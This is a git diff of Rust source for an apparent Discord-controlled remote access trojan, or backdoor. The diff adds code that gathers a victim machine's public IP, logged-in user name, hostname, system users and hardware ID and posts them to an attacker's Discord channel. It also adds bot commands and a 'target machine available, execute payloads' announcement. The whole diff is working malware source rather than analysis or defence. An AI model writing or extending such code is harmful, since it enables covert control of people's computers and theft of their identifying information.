@@ -6,15 +6,20 @@ use std::io::{self, Write};
 use chrono::prelude::*;
 use reqwest;
 use serenity;
+use serenity::builder::{CreateEmbed, CreateMessage};
+use serenity::framework::standard::macros::hook;
+use serenity::framework::standard::{Args, CommandResult};
 use serenity::http::Http;
+use serenity::model::channel;
 use serenity::model::webhook::Webhook;
 use serenity::prelude::*;
 use serenity::model::prelude::Message;
+use serenity::utils::Color;
 use sysinfo::{System, SystemExt, User, UserExt};
+use serde::Serialize;
+use serde_json::{Value, json};
 use machine_uid;
 use whoami::{hostname, realname};
-use serde_json::{Value, json};
-use serde::Serialize;
 use jsonformat::{Indentation, format};
 
 pub const BOT_PREFIX: &str = "$";
@@ -37,14 +42,14 @@ pub fn create_log_msg(msg: String) -> String {
     nano.truncate(2);
 
     format!(
-        "**[** CET {}/{}/{} - {}:{}:{}.{} **] >>** {}",
-        format!("{:0>2}", t.day()),
-        format!("{:0>2}", t.month()),
-        format!("{:0>2}", t.year()),
-        format!("{:0>2}", t.hour()),
-        format!("{:0>2}", t.minute()),
-        format!("{:0>2}", t.second()),
-        format!("{:0>2}", nano),
+        "**[** CET {:0>2}/{:0>2}/{:0>2} - {:0>2}:{:0>2}:{:0>2}.{:0>2} **] >>** {:0>2}",
+        t.day(),
+        t.month(),
+        t.year(),
+        t.hour(),
+        t.minute(),
+        t.second(),
+        nano,
         msg
     )
 }
@@ -142,11 +147,7 @@ impl RatConfig {
                 json.insert(realname(), Value::String(hwid));
                 let new_targets_json: Value = json.to_owned().into();
 
-                let buf = Vec::new();
-                let formatter = serde_json::ser::PrettyFormatter::with_indent(b"\t");
-                let mut ser = serde_json::Serializer::with_formatter(buf, formatter);
-                new_targets_json.serialize(&mut ser).unwrap();
-                let string = String::from_utf8(ser.into_inner()).unwrap();
+                let string = format_json_msg(&new_targets_json);
 
                 cfg_msg.unwrap().edit(&ctx.http, |m| m
                     .content(to_discord_json(string))
@@ -154,18 +155,22 @@ impl RatConfig {
             }
         } else {
             let default_msg = json!({ realname(): hwid });
-
-            let buf = Vec::new();
-            let formatter = serde_json::ser::PrettyFormatter::with_indent(b"\t");
-            let mut ser = serde_json::Serializer::with_formatter(buf, formatter);
-            default_msg.serialize(&mut ser).unwrap();
-            let string = String::from_utf8(ser.into_inner()).unwrap();
+            let string = format_json_msg(&default_msg);
 
             channel.send_message(&ctx.http, |m| m
                 .content(to_discord_json(string))
             ).await;
         }
 
+        Ok(())
+    }
+
+    pub async fn send_target_embed(&self, ctx: &Context) -> Result<(), SerenityError> {
+        let channel = ctx.cache.guild_channel(self.payloads_ch).unwrap();
+        let t_embed = target_embed().await;
+        channel.send_message(&ctx.http, |m| m
+            .set_embed(t_embed)
+        ).await?;     
         Ok(())
     }
 }
@@ -190,6 +195,77 @@ fn from_discord_json(mut string: String) -> String {
 }
 
 
+fn format_json_msg(json: &Value) -> String {
+    let buf = Vec::new();
+    let formatter = serde_json::ser::PrettyFormatter::with_indent(b"\t");
+    let mut ser = serde_json::Serializer::with_formatter(buf, formatter);
+    json.serialize(&mut ser).unwrap();
+    String::from_utf8(ser.into_inner()).unwrap()
+}
 
 
+async fn ip(ctx: &Context, msg: &Message) -> CommandResult {
+    let ip = get_pub_ip().await;
+    let embed = msg.channel_id
+        .send_message(&ctx.http, |m|
+            m.embed(|e| e
+                .color(Color::DARK_GREEN)
+                .description(format!("IP: {}", ip))
+                // .description(format!("🏓 Bots Latency: {:?}", runner.latency))
+            )
+        ).await;
+    
+    match embed {
+        Ok(_) => { println!(" {} sent Ping response!", Pr::event()); },
+        Err(e) => { println!(" {} Couldn't send message: {}", Pr::err(), e); }
+    }
+
+    Ok(())
+}
+
+// TODO
+async fn info(ctx: &Context, msg: &Message, test: Args) -> CommandResult {
+    let users = get_system_users();
+
+    println!(" args : {:?}", test);
+
+    msg.channel_id.send_message(&ctx.http, |f| f
+        .content(format!(" - {}", users.join("\n- ")))
+    ).await;
+
+    Ok(())
+}
+
+
+pub async fn target_embed() -> CreateEmbed {
+    let system = System::new_all();
+    let boot_time = Local::now();
+
+    CreateEmbed::default()
+        .color(Color::RED)
+        .title("Current targeted machine is now available!")
+        .description("You can now use commands and execute payloads")
+        .author(|a| a
+            .name(whoami::hostname())
+            .icon_url("https://i.pcmag.com/imagery/articles/061CyMCZV6G2sXUmreKHvXS-1..v1581020108.jpg")
+            .url("https://img.nieuwsblad.be/290BzC-HhLF-NteAGwtLTu3EU38=/960x640/smart/https%3A%2F%2Fstatic.nieuwsblad.be%2FAssets%2FImages_Upload%2F2022%2F03%2F17%2F1fdb8bd9-da61-4e63-a980-b204ee4ae678.jpg")
+        )
+        .thumbnail("https://img.nieuwsblad.be/290BzC-HhLF-NteAGwtLTu3EU38=/960x640/smart/https%3A%2F%2Fstatic.nieuwsblad.be%2FAssets%2FImages_Upload%2F2022%2F03%2F17%2F1fdb8bd9-da61-4e63-a980-b204ee4ae678.jpg")
+        .field("Public-Ip", get_pub_ip().await, true)
+        .field("Logged-In User", whoami::realname(), true)
+        .field("Backdoor Startup", format!(
+            "{:0>2}/{:0>2}/{:0>2} - {:0>2}:{:0>2}:{:0>2} CET",
+            boot_time.day(),
+            boot_time.month(),
+            boot_time.year(),
+            boot_time.hour(),
+            boot_time.minute(),
+            boot_time.second(),
+        ),
+        true
+        )
+        .footer(|f| f
+            .text("!help for list of commands")
+        ).to_owned()
+}
 
